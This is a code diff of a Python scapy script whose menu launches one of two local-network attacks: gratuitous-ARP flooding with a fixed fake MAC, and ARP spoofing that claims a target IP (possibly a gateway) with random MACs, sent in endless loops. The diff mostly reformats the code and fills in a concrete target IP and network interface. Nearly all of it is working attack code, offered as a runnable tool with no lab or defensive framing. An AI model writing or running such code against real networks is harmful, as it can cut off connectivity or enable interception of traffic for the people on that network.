@@ -5,8 +5,8 @@ import os
 from colorama import Fore, Back, Style
 from scapy.layers.l2 import ARP, Ether
 
-TARGET_IP = ""  # <- IP (maybe Gateway)
-INTERFACE = ""  # <- Network interface
+TARGET_IP = "172.16.13.1"  # <- IP (maybe Gateway)
+INTERFACE = "wlo1"  # <- Network interface
 FAKE_MAC = "de:ad:be:ef:00:01"  # <- Simulate an unknown device
 
 # ---------------- We need to carry out an attack, right? ASCII art is essential to its success. :) ----------------
@@ -36,21 +36,30 @@ spoof_art = r"""   _  ____      ____  ____  ____   ___        _       ____    __
 
 # ------------------------------------------------------------------------------------------------------------------
 
+
 def flood_attack():
 
-    os.system('clear')
+    os.system("clear")
     print(Fore.YELLOW + flood_art + Fore.RESET)
-    print(Style.BRIGHT + Fore.BLACK + Back.MAGENTA + f"Starting flooding attack -> mac: {FAKE_MAC}" + Back.RESET)
+    print(
+        Style.BRIGHT
+        + Fore.BLACK
+        + Back.MAGENTA
+        + f"Starting flooding attack -> mac: {FAKE_MAC}"
+        + Back.RESET
+    )
 
     ether_layer = Ether(src=FAKE_MAC, dst="ff:ff:ff:ff:ff:ff")
-    arp_layer = ARP(op=2, pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=TARGET_IP, hwsrc=FAKE_MAC)
+    arp_layer = ARP(
+        op=2, pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=TARGET_IP, hwsrc=FAKE_MAC
+    )
 
     packet = ether_layer / arp_layer
 
     try:
         while True:
             sendp(packet, iface=INTERFACE, verbose=False)
-            print(Fore.MAGENTA + ".", end='', flush=True)
+            print(Fore.MAGENTA + ".", end="", flush=True)
             time.sleep(0.05)  # 20 pkt/sec
     except KeyboardInterrupt:
         print(Fore.RED + Back.BLACK + "\nStopped." + Fore.RESET + Back.RESET)
@@ -58,17 +67,22 @@ def flood_attack():
 
 def spoofing_attack():
 
-    os.system('clear')
+    os.system("clear")
     print(Fore.YELLOW + spoof_art + Fore.RESET)
     print(Style.BRIGHT + Fore.BLACK + Back.MAGENTA + f"Starting arp spoofing.")
 
     try:
         while True:
             # Generate a rand mac to alert the system
-            rand_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255),
-                                                    random.randint(0, 255))
+            rand_mac = "02:00:00:%02x:%02x:%02x" % (
+                random.randint(0, 255),
+                random.randint(0, 255),
+                random.randint(0, 255),
+            )
 
-            ether_layer = Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff") # We should use the correct mac, not the broadcast one
+            ether_layer = Ether(
+                src=rand_mac, dst="ff:ff:ff:ff:ff:ff"
+            )  # We should use the correct mac, not the broadcast one
             arp_layer = ARP(op=2, pdst=TARGET_IP, psrc=TARGET_IP, hwsrc=rand_mac)
 
             packet = ether_layer / arp_layer
@@ -89,10 +103,11 @@ if __name__ == "__main__":
     print(Fore.YELLOW + arp_art + Fore.RESET)
     print("1. Flooding")
     print("2. Spoofing")
-    resp = input(Style.BRIGHT + Fore.BLACK + Back.YELLOW + "Select -> (1/2): " + Back.RESET)
+    resp = input(
+        Style.BRIGHT + Fore.BLACK + Back.YELLOW + "Select -> (1/2): " + Back.RESET
+    )
 
-    if resp == '1':
+    if resp == "1":
         flood_attack()
     else:
         spoofing_attack()
-
